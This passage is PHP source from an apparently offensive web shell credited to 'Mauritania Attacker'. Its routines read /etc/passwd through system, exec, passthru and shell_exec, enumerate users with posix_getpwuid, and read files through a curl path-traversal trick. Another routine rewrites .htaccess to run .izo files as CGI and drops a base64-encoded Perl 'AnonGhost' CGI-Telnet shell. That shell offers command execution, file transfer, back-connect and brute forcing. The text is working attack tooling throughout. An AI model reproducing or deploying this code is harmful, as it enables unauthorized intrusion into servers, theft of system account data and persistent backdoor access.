		echo '<form method="POST"><input type="text" name="fak" size="70" value="/etc/passwd"> <input type="submit" value="Encode"></form><br>';
		}else{
		$b4se64 =$_POST['fak'];
		$heno =base64_encode($b4se64);
		echo '<p align="center">';
		echo '<textarea method="POST" rows="1" cols="60" wrar="off">';
		print $heno;
		echo '</textarea>';
		}
		echo '<form method="post" /><input type="text" name="coz" size="43" value="L2V0Yy9wYXNzd2Q=" /> <input type="submit" value="Execute" /> <select name=dec><option value=show>Read</option><option value=decode>Command</option></select></form><br>';
		if( !empty($_POST['coz']) )
		if ($dec=='decode'){echo '<form name=form method=POST>';}
		echo "<p align=center><textarea style='width: 543px; height: 420px;' class='area' method='POST' name='codene' cols='70' rows='15' wrar='off' >";
		$ss=$_POST['coz'];
		$file = base64_decode($ss);
		if((curl_exec(curl_init('file:ftp://../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../'.$file))) and empty($file))
		if ($_POST['dec']=='decode'){echo base64_encode($_POST['codene']);}
		echo '</textarea></p>';
		echo '</td>
		</tr>';

}
elseif($_GET['do'] == 'betc') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=betc'>Bypass /etc/passwd</a> </li>";
echo "<li> <a href='?dir=$dir&do=baper'>Bypass Perl Security</a> </li>";
echo "<li> <a href='?dir=$dir&do=baus'>Bypass User Server</a> </li>";
echo "<li> <a href='?dir=$dir&do=barut'>Bypass Perl Security</a> </li>";
echo "<li> <a href='?dir=$dir&do=com64'>Base64 Command</a> </li>";
echo "</ul>";
echo "</center>";
		echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass /etc/passwd Priv8</span><br>Coded By Mauritania Attacker<center><br>';
		echo '<div class="tul"><font color="ee5500" face="Tahoma, Geneva, sans-serif" style="font-size: 8pt">


		<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with System Function
		<form method="post">
		<input type="submit" value="Bypass" name="syst">
		</form>
		</center>
		</p>

		<p><center>Bypass with Passthru Function
		<form method="post">
		<font face="Tahoma" color="#007700" size="2pt">
		<input type="submit" value="Bypass" name="passth">
		</form>
		</center>
		</p>

		<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with exec Function
		<form method="post">
		<input type="submit" value="Bypass" name="ex">
		</form>
		</center>
		</p>

		<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with shell_exec Function
		<form method="post">
		<input type="submit" value="Bypass" name="shex">
		</form>
		</center>
		</p>

		<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with posix_getpwuid Function
		<form method="post">
		<input type="submit" value="Bypass" name="mauritania">
		</form>
		</center>
		</p>

		<center>';
			

		//System Function //
		if($_POST['syst'])
		{

		echo"<textarea style='width: 543px; height: 420px;' class='area' cols='65' rows='15'>";
		echo system("cat /etc/passwd");
		echo"</textarea><br>";
		echo"
		<br>
		<b>
		</b>
		<br>
		";
		}
		echo '
		</center>
		<center>';
			


		//Passthru Function //
		if($_POST['passth'])
		{
		echo"<textarea style='width: 543px; height: 420px;' class='area' cols='65' rows='15'>";
		echo passthru("cat /etc/passwd");
		echo"</textarea><br>";
		echo"
		<br>
		<b>

		</b>
		<br>
		";
		  
		}


		echo '
		</center>
		<center>';
			


		//exec Function //
		if($_POST['ex'])
		{
		echo"<textarea style='width: 543px; height: 420px;' class='area' cols='65' rows='15'>";
		echo exec("cat /etc/passwd");
		echo"</textarea><br>";
		echo"
		<br>
		<b>
		</b>
		<br>
		";
		}


		echo '
		</center>
		<center>';


		//exec Function //
		if($_POST['shex'])
		{
		echo"<textarea style='width: 543px; height: 420px;' class='area' cols='65' rows='15'>";
		echo shell_exec("cat /etc/passwd");
		echo"</textarea><br>";
		echo"
		<br>
		<b>
		</b>
		<br>
		";
		}
		echo '</center>
		<center>';
			


		//posix_getpwuid Function //
		if($_POST['mauritania'])
		{
		echo"<textarea style='width: 543px; height: 420px;' class='area' cols='65' rows='15'>";
		for($uid=0;$uid<60000;$uid++){ 
		$ara = posix_getpwuid($uid);
		if (!empty($ara)) {
		while (list ($key, $val) = each($ara)){
		print "$val:";
		}
		print "\n";
		}
		}
		echo"</textarea><br>";
		echo"
		<br>
		<b>
		</b>
		<br>
		";
		}	
}	
elseif($_GET['do'] == 'cgi') {
		mkdir('cgi4e', 0755);
		chdir('cgi4e');
		$kokdosya = ".htaccess";
		$dosya_adi = "$kokdosya";
		$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
		$metin = "AddType application/x-httpd-cgi .izo
		AddType application/x-httpd-cgi .izo

		AddHandler cgi-script .izo
		AddHandler cgi-script .izo";    
		fwrite ( $dosya , $metin ) ;
		fclose ($dosya);
		$cgi4e = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQp1c2UgTUlNRTo6QmFzZTY0Ow0KJFZlcnNpb249ICJDR0ktVGVsbmV0IFZlcnNpb24gMS40IjsNCiRFZGl0UGVyc2lvbj0iQW5vbkdob3N0IjsNCg0KJFBhc3N3b3JkID0gIkJUTSI7CQkJIyBDaGFuZ2UgdGhpcy4gWW91IHdpbGwgbmVlZCB0byBlbnRlciB0aGlzDQoJCQkJIyB0byBsb2dpbi4NCnN1YiBJc19XaW4oKXsNCgkkb3MgPSAmdHJpbSgkRU5WeyJTRVJWRVJfU09GVFdBUkUifSk7DQoJaWYoJG9zID1+IG0vd2luL2kpew0KCQlyZXR1cm4gMTsNCgl9ZWxzZXsNCgkJcmV0dXJuIDA7DQoJfQ0KfQ0KJFdpbk5UID0gJklzX1dpbigpOwkJCSMgWW91IG5lZWQgdG8gY2hhbmdlIHRoZSB2YWx1ZSBvZiB0aGlzIHRvIDEgaWYNCgkJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRvd3MgTlQNCgkJCQkJIyBtYWNoaW5lLiBJZiB5b3UncmUgcnVubmluZyBpdCBvbiBVbml4LCB5b3UNCgkJCQkJIyBjYW4gbGVhdmUgdGhlIHZhbHVlIGFzIGl0IGlzLg0KDQokTlRDbWRTZXAgPSAiJiI7CQkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULg0KDQokVW5peENtZFNlcCA9ICI7IjsJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcw0KCQkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFVuaXguDQoNCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTA7CQkjIFRpbWUgaW4gc2Vjb25kcyBhZnRlciBjb21tYW5kcyB3aWxsIGJlIGtpbGxlZA0KCQkJCQkjIERvbid0IHNldCB0aGlzIHRvIGEgdmVyeSBsYXJnZSB2YWx1ZS4gVGhpcyBpcw0KCQkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0DQoJCQkJCSMgdGFrZSB2ZXJ5IGxvbmcgdG8gZXhlY3V0ZSwgbGlrZSAiZmluZCAvIi4NCgkJCQkJIyBUaGlzIGlzIHZhbGlkIG9ubHkgb24gVW5peCBzZXJ2ZXJzLiBJdCBpcw0KCQkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4NCg0KJFNob3dEeW5hbWljT3V0cHV0ID0gMTsJCQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlDQoJCQkJCSMgYnJvd3NlciBhcyBzb29uIGFzIGl0IGlzIG91dHB1dCwgb3RoZXJ3aXNlDQoJCQkJCSMgaXQgaXMgYnVmZmVyZWQgYW5kIHNlbmQgd2hlbiB0aGUgY29tbWFuZA0KCQkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UNCgkJCQkJIyBwaW5nLCBzbyB0aGF0IHlvdSBjYW4gc2VlIHRoZSBvdXRwdXQgYXMgaXQNCgkJCQkJIyBpcyBiZWluZyBnZW5lcmF0ZWQuDQoNCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISENCg0KJENtZFNlcCA9ICgkV2luTlQgPyAkTlRDbWRTZXAgOiAkVW5peENtZFNlcCk7DQokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7DQokUGF0aFNlcCA9ICgkV2luTlQgPyAiXFwiIDogIi8iKTsNCiRSZWRpcmVjdG9yID0gKCRXaW5OVCA/ICIgMj4mMSAxPiYyIiA6ICIgMT4mMSAyPiYxIik7DQokY29scz0gMTMwOw0KJHJvd3M9IDI2Ow0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBSZWFkcyB0aGUgaW5wdXQgc2VudCBieSB0aGUgYnJvd3NlciBhbmQgcGFyc2VzIHRoZSBpbnB1dCB2YXJpYWJsZXMuIEl0DQojIHBhcnNlcyBHRVQsIFBPU1QgYW5kIG11bHRpcGFydC9mb3JtLWRhdGEgdGhhdCBpcyB1c2VkIGZvciB1cGxvYWRpbmcgZmlsZXMuDQojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uDQojIE90aGVyIHZhcmlhYmxlcyBjYW4gYmUgYWNjZXNzZWQgdXNpbmcgJGlueyd2YXInfSwgd2hlcmUgdmFyIGlzIHRoZSBuYW1lIG9mDQojIHRoZSB2YXJpYWJsZS4gTm90ZTogTW9zdCBvZiB0aGUgY29kZSBpbiB0aGlzIGZ1bmN0aW9uIGlzIHRha2VuIGZyb20gb3RoZXIgQ0dJDQojIHNjcmlwdHMuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUmVhZFBhcnNlIA0Kew0KCWxvY2FsICgqaW4pID0gQF8gaWYgQF87DQoJbG9jYWwgKCRpLCAkbG9jLCAka2V5LCAkdmFsKTsNCgkkTXVsdGlwYXJ0Rm9ybURhdGEgPSAkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLzsNCglpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJHRVQiKQ0KCXsNCgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQoJfQ0KCWVsc2lmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIlBPU1QiKQ0KCXsNCgkJYmlubW9kZShTVERJTikgaWYgJE11bHRpcGFydEZvcm1EYXRhICYgJFdpbk5UOw0KCQlyZWFkKFNURElOLCAkaW4sICRFTlZ7J0NPTlRFTlRfTEVOR1RIJ30pOw0KCX0NCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhDQoJaWYoJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC8pDQoJew0KCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IA0KCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyANCgkJJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsNCgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0KCQkkSGVhZGVyID0gJGA7DQoJCSRCb2R5ID0gJCc7DQogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlDQoJCSRpbnsnZmlsZWRhdGEnfSA9ICRCb2R5Ow0KCQkkSGVhZGVyID1+IC9maWxlbmFtZT1cIiguKylcIi87IA0KCQkkaW57J2YnfSA9ICQxOyANCgkJJGlueydmJ30gPX4gcy9cIi8vZzsNCgkJJGlueydmJ30gPX4gcy9ccy8vZzsNCg0KCQkjIHBhcnNlIHRyYWlsZXINCgkJZm9yKCRpPTI7ICRsaXN0WyRpXTsgJGkrKykNCgkJeyANCgkJCSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KCQkJJGxpc3RbJGldID1+IC9cIihcdyspXCIvOw0KCQkJJGtleSA9ICQxOw0KCQkJJHZhbCA9ICQnOw0KCQkJJHZhbCA9fiBzLyheKFxyXG5cclxufFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gPSAkdmFsOyANCgkJfQ0KCX0NCgllbHNlICMgc3RhbmRhcmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRpcGFydCkNCgl7DQoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsNCgkJZm9yZWFjaCAkaSAoMCAuLiAkI2luKQ0KCQl7DQoJCQkkaW5bJGldID1+IHMvXCsvIC9nOw0KCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsNCgkJCSRrZXkgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9IC49ICIiIGlmIChkZWZpbmVkKCRpbnska2V5fSkpOw0KCQkJJGlueyRrZXl9IC49ICR2YWw7DQoJCX0NCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIGZ1bmN0aW9uIEVuY29kZURpcjogZW5jb2RlIGJhc2U2NCBQYXRoDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgRW5jb2RlRGlyDQp7DQoJbXkgJGRpciA9IHNoaWZ0Ow0KCSRkaXIgPSB0cmltKGVuY29kZV9iYXNlNjQoJGRpcikpOw0KCSRkaXIgPX4gcy8oXHJ8XG4pLy87DQoJcmV0dXJuICRkaXI7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBQYWdlIEhlYWRlcg0KIyBBcmd1bWVudCAxOiBGb3JtIGl0ZW0gbmFtZSB0byB3aGljaCBmb2N1cyBzaG91bGQgYmUgc2V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlSGVhZGVyDQp7DQoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOw0KCW15ICRpZCA9IGBpZGAgaWYoISRXaW5OVCk7DQoJbXkgJGluZm8gPSBgdW5hbWUgLXMgLW4gLXIgLWlgOw0KCXByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbFxuXG4iOw0KCXByaW50IDw8RU5EOw0KPGh0bWw+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9ImNvbnRlbnQtdHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij4NCjx0aXRsZT5Bbm9uR2hvc3QgQ2dpLVRlbG5ldCBbICRWZXJzaW9uIF08L3RpdGxlPg0KJEh0bWxNZXRhSGVhZGVyDQo8L2hlYWQ+DQo8c3R5bGU+DQpib2R5ew0KZm9udDogMTBwdCBWZXJkYW5hOw0KY29sb3I6ICNmZmY7DQp9DQp0cix0ZCx0YWJsZSxpbnB1dCx0ZXh0YXJlYSB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCn0NCiNkb21haW4gdHI6aG92ZXJ7DQpiYWNrZ3JvdW5kLWNvbG9yOiAjNDQ0Ow0KfQ0KdGQgew0KY29sb3I6ICMyQkE4RUM7DQp9DQoubGlzdGRpciB0ZHsNCgl0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQoubGlzdGRpciB0aHsNCgljb2xvcjogI0ZGOTkwMDsNCn0NCi5kaXIsLmZpbGUNCnsNCgl0ZXh0LWFsaWduOiBsZWZ0ICFpbXBvcnRhbnQ7DQp9DQouZGlyew0KCWZvbnQtc2l6ZTogMTBwdDsgDQoJZm9udC13ZWlnaHQ6IGJvbGQ7DQp9DQp0YWJsZSB7DQpCQUNLR1JPVU5ELUNPTE9SOiAjMTExOw0KfQ0KaW5wdXQgew0KQkFDS0dST1VORC1DT0xPUjogQmxhY2s7DQpjb2xvcjogI2ZmOTkwMDsNCn0NCmlucHV0LnN1Ym1pdCB7DQp0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQpjb2xvcjogI0ZGRkZGRjsNCmJvcmRlci1jb2xvcjogIzAwOTkwMDsNCn0NCmNvZGUgew0KYm9yZGVyOiBkYXNoZWQgMHB4ICMzMzM7DQpjb2xvcjogd2hpbGU7DQp9DQpydW4gew0KYm9yZGVyCQkJOiBkYXNoZWQgMHB4ICMzMzM7DQpjb2xvcjogI0ZGMDBBQTsNCn0NCnRleHRhcmVhIHsNCkJBQ0tHUk9VTkQtQ09MT1I6ICMxYjFiMWI7DQpmb250OiBGaXhlZHN5cyBib2xkOw0KY29sb3I6ICNhYWE7DQp9DQpBOmxpbmsgew0KCUNPTE9SOiAjMkJBOEVDOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6dmlzaXRlZCB7DQoJQ09MT1I6ICMyQkE4RUM7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTpob3ZlciB7DQoJdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCAwLjNlbSBjeWFuOw0KCWNvbG9yOiAjRkZGRkZGOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6YWN0aXZlIHsNCgljb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCi5saXN0ZGlyIHRyOmhvdmVyew0KCWJhY2tncm91bmQ6ICM0NDQ7DQp9DQoubGlzdGRpciB0cjpob3ZlciB0ZHsNCgliYWNrZ3JvdW5kOiAjNDQ0Ow0KCXRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsNCgljb2xvcjogI0ZGRkZGRjsgVEVYVC1ERUNPUkFUSU9OOiBub25lOw0KfQ0KLm5vdGxpbmV7DQoJYmFja2dyb3VuZDogIzExMTsNCn0NCi5saW5lew0KCWJhY2tncm91bmQ6ICMyMjI7DQp9DQo8L3N0eWxlPg0KPHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+DQpmdW5jdGlvbiBFbmNvZGVyKG5hbWUpDQp7DQoJdmFyIGUgPSAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQobmFtZSk7DQoJZS52YWx1ZSA9IGJ0b2EoZS52YWx1ZSk7DQoJcmV0dXJuIHRydWU7DQp9DQpmdW5jdGlvbiBjaG1vZF9mb3JtKGksZmlsZSkNCnsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZVBlcm1zXyIraSkuaW5uZXJIVE1MPSI8Zm9ybSBuYW1lPUZvcm1QZXJtc18iICsgaSsgIiBhY3Rpb249JycgbWV0aG9kPSdQT1NUJz48aW5wdXQgaWQ9dGV4dF8iICsgaSArICIgIG5hbWU9Y2htb2QgdHlwZT10ZXh0IHNpemU9NSAvPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyB2YWx1ZT1PSz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hIHZhbHVlPSdndWknPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWQgdmFsdWU9JyRFbmNvZGVDdXJyZW50RGlyJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1mIHZhbHVlPSciK2ZpbGUrIic+PC9mb3JtPiI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7DQp9DQpmdW5jdGlvbiBybV9jaG1vZF9mb3JtKHJlc3BvbnNlLGkscGVybXMsZmlsZSkNCnsNCglyZXNwb25zZS5pbm5lckhUTUwgPSAiPHNwYW4gb25jbGljaz1cXFwiY2htb2RfZm9ybSgiICsgaSArICIsJyIrIGZpbGUrICInKVxcXCIgPiIrIHBlcm1zICsiPC9zcGFuPjwvdGQ+IjsNCn0NCmZ1bmN0aW9uIHJlbmFtZV9mb3JtKGksZmlsZSxmKQ0Kew0KCWYucmVwbGFjZSgvXFxcXC9nLCJcXFxcXFxcXCIpOw0KCXZhciBiYWNrPSJybV9yZW5hbWVfZm9ybSgiK2krIixcXFwiIitmaWxlKyJcXFwiLFxcXCIiK2YrIlxcXCIpOyByZXR1cm4gZmFsc2U7IjsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGZvcm0gbmFtZT1Gb3JtUGVybXNfIiArIGkrICIgYWN0aW9uPScnIG1ldGhvZD0nUE9TVCc+PGlucHV0IGlkPXRleHRfIiArIGkgKyAiICBuYW1lPXJlbmFtZSB0eXBlPXRleHQgdmFsdWU9ICciK2ZpbGUrIicgLz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgdmFsdWU9T0s+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBiYWNrICsgIicgdmFsdWU9Q2FuY2VsPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJEVuY29kZUN1cnJlbnREaXInPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWYgdmFsdWU9JyIrZmlsZSsiJz48L2Zvcm0+IjsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidGV4dF8iICsgaSkuZm9jdXMoKTsNCn0NCmZ1bmN0aW9uIHJtX3JlbmFtZV9mb3JtKGksZmlsZSxmKQ0Kew0KCWlmKGY9PSdmJykNCgl7DQoJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlXyIraSkuaW5uZXJIVE1MPSI8YSBocmVmPSc/YT1jb21tYW5kJmQ9JEVuY29kZUN1cnJlbnREaXImYz1lZGl0JTIwIitmaWxlKyIlMjAnPiIgK2ZpbGUrICI8L2E+IjsNCgl9ZWxzZQ0KCXsNCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWd1aSZkPSIrZisiJz5bICIgK2ZpbGUrICIgXTwvYT4iOw0KCX0NCn0NCjwvc2NyaXB0Pg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IiMwYzBjMGMiIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCI+DQo8Y2VudGVyPjxjb2RlPg0KPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+DQo8dHI+DQoJPHRkIGFsaWduPSJjZW50ZXIiIHJvd3NwYW49Mz4NCgkJPGI+PGZvbnQgc2l6ZT0iMyI+by0tLVsgICRFZGl0UGVyc2lvbiBdLS0tbzwvZm9udD48L2I+DQoJPC90ZD4NCgk8dGQ+DQoJCSRpbmZvDQoJPC90ZD4NCgk8dGQ+U2VydmVyIElQOjxmb250IGNvbG9yPSIjZmY5OTAwIj4gJEVOVnsnU0VSVkVSX0FERFInfTwvZm9udD4gfCBZb3VyIElQOiA8Zm9udCBjb2xvcj0iI2ZmOTkwMCI+JEVOVnsnUkVNT1RFX0FERFInfTwvZm9udD4NCgk8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIj4NCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbiI+SG9tZTwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWNvbW1hbmQmZD0kRW5jb2RlQ3VycmVudERpciI+Q29tbWFuZDwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Z3VpJmQ9JEVuY29kZUN1cnJlbnREaXIiPkdVSTwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXVwbG9hZCZkPSRFbmNvZGVDdXJyZW50RGlyIj5VcGxvYWQgRmlsZTwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmQ9JEVuY29kZUN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWJhY2tiaW5kIj5CYWNrICYgQmluZDwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9YnJ1dGVmb3JjZXIiPkJydXRlIEZvcmNlcjwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Y2hlY2tsb2ciPkNoZWNrIExvZzwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG9tYWluc3VzZXIiPkRvbWFpbnMvVXNlcnM8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWxvZ291dCI+TG9nb3V0PC9hPiB8DQo8YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0iIyI+SGVscDwvYT4NCjwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkIGNvbHNwYW49IjIiPg0KJGlkDQo8L3RkPg0KPC90cj4NCjwvdGFibGU+DQo8Zm9udCBpZD0iUmVzcG9uc2VEYXRhIiBjb2xvcj0iI0ZGRkZGRiIgPg0KRU5EDQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgTG9naW4gU2NyZWVuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpblNjcmVlbg0Kew0KCXByaW50IDw8RU5EOw0KPHByZT48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQpUeXBpbmdUZXh0ID0gZnVuY3Rpb24oZWxlbWVudCwgaW50ZXJ2YWwsIGN1cnNvciwgZmluaXNoZWRDYWxsYmFjaykgew0KICBpZigodHlwZW9mIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkID09ICJ1bmRlZmluZWQiKSB8fCAodHlwZW9mIGVsZW1lbnQuaW5uZXJIVE1MID09ICJ1bmRlZmluZWQiKSkgew0KICAgIHRoaXMucnVubmluZyA9IHRydWU7CS8vIE5ldmVyIHJ1bi4NCiAgICByZXR1cm47DQogIH0NCiAgdGhpcy5lbGVtZW50ID0gZWxlbWVudDsNCiAgdGhpcy5maW5pc2hlZENhbGxiYWNrID0gKGZpbmlzaGVkQ2FsbGJhY2sgPyBmaW5pc2hlZENhbGxiYWNrIDogZnVuY3Rpb24oKSB7IHJldHVybjsgfSk7DQogIHRoaXMuaW50ZXJ2YWwgPSAodHlwZW9mIGludGVydmFsID09ICJ1bmRlZmluZWQiID8gMTAwIDogaW50ZXJ2YWwpOw0KICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5lbGVtZW50LmlubmVySFRNTDsNCiAgdGhpcy51bnBhcnNlZE9yaWdUZXh0ID0gdGhpcy5vcmlnVGV4dDsNCiAgdGhpcy5jdXJzb3IgPSAoY3Vyc29yID8gY3Vyc29yIDogIiIpOw0KICB0aGlzLmN1cnJlbnRUZXh0ID0gIiI7DQogIHRoaXMuY3VycmVudENoY